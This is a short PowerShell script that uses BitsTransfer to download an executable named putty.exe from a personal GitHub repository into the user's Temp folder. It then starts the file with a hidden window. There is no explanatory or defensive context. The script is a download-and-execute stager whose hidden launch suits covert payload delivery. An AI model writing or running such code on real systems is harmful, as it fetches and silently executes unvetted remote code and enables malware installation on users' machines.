$url = "https://github.com/c0mp4s5/test/raw/master/putty.exe"
$output = "C:\Users\$env:username\AppData\Local\Temp\putty.exe"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous

Start-Process $output -WindowStyle hidden;
